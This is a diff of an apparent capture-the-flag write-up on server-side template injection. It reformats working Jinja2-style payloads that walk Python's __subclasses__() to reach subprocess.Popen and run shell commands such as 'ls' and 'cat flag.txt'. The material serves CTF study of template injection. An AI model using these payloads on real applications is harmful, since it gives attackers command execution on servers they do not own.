@@ -68,7 +68,10 @@ If the site returns `56`, then SSTI is confirmed.
 To escalate, we inject the following payload to access built-ins:
 
 
-**&#123;&#123;''.class.mro[2].subclasses()&#125;&#125;**
+{% raw %}
+**Code:** `{{ ''.__class__.mro[2].__subclasses__() }}`
+{% endraw %}
+
 
 
 This gives access to all subclasses, including `Popen`.
@@ -81,7 +84,10 @@ This gives access to all subclasses, including `Popen`.
 
 We locate the index of `subprocess.Popen` subclass from the list and use it to execute code. Example:
 
-**&#123;&#123;''.class.mro[2].subclasses()[&lt;index&gt;]("ls", shell=True, stdout=-1).communicate()&#125;&#125;**
+{% raw %}
+**Code:** `{{ ''.__class__.mro[2].__subclasses__()[<index>]("ls", shell=True, stdout=-1).communicate() }}`
+{% endraw %}
+
 
 
 Try commands like `cat flag.txt`.
@@ -92,7 +98,10 @@ Try commands like `cat flag.txt`.
 
 Eventually, we find the flag using a working payload like:
 
-**&#123;&#123;''.class.mro[2].subclasses()[&lt;index&gt;]("cat flag.txt", shell=True, stdout=-1).communicate()&#125;&#125;**
+{% raw %}
+**Code:** `{{ ''.__class__.mro[2].__subclasses__()[<index>]("cat flag.txt", shell=True, stdout=-1).communicate() }}`
+{% endraw %}
+
 
 
 
